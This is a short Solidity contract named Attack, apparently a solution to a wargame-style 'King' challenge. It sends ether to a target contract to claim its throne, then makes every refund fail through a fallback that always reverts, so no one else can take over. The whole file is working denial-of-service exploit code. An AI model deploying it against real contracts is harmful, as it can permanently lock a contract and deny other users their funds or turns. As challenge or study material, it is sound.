// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  constructor(address _kingAddress) public payable {
    address(_kingAddress).call{value: msg.value}("");
  }

  fallback() external payable {
    revert();
  }
}